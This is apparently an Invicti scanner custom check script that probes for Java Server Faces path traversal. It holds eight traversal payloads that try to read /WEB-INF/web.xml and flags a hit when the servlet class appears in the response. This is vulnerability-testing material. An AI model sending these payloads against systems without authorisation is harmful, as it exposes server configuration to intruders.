/* 
 *  This Security Check script was generated by Invicti Standard 23.11.0.42728, at 11/20/2023 3:25:52 PM 
 *  For more information about Custom Script Checks and samples, please refer to documentation: 
 *  https://www.invicti.com/support/custom-security-checks-scripting/ 
 */
var attacks = [{
    id: 'df02573d-733c-4285-ad4e-4ea11c7982b9',
    name: 'Java Server Faces Path Traversal'
}];

function analyze(context, response) {

    var re = /(https?:\/\/)([^:^\/]*)(:?\d*)(.*)?/;
    var capture = response.Uri.match(re);
    var url = capture[1].toString() + capture[2].toString() + capture[3].toString() + capture[4].toString();

    // remove if url contains '/' char at the end
    if (url.charAt(url.length - 1) === '/') {
        url = url.substring(0, url.length - 1);
    }
    logUI("url: " + url);

    // create a array of attacks
    var attacks = [
        '/javax.faces.resource.../WEB-INF/web.xml.jsf',
        '/javax.faces.resource.../WEB-INF/web.xml.xhtml',
        '/javax.faces.resource./WEB-INF/web.xml.jsf?ln=..',
        '/javax.faces.resource/â€¦\\\\WEB-INF/web.xml',
        '/jenia4faces/template/../WEB-INF/web.xml/',
        '/faces/javax.faces.resource/web.xml?ln=..\\\\WEB-INF',
        '/faces/javax.faces.resource/..\\\\WEB-INF/web.xml',
        '/faces/javax.faces.resource/web.xml?loc=../WEB-INF'
    ];

    // loop through the array of attacks
    for (var i = 0; i < attacks.length; i++) {
        var request = new Request(url + attacks[i]);
        var response = invicti.request(request);

        if (response.Body.indexOf('<servlet-class>javax.faces.') > -1) {
            return new Vulnerability('f16e90d8-6d06-4ee3-9856-138409d1ba1f');
        }
    }
}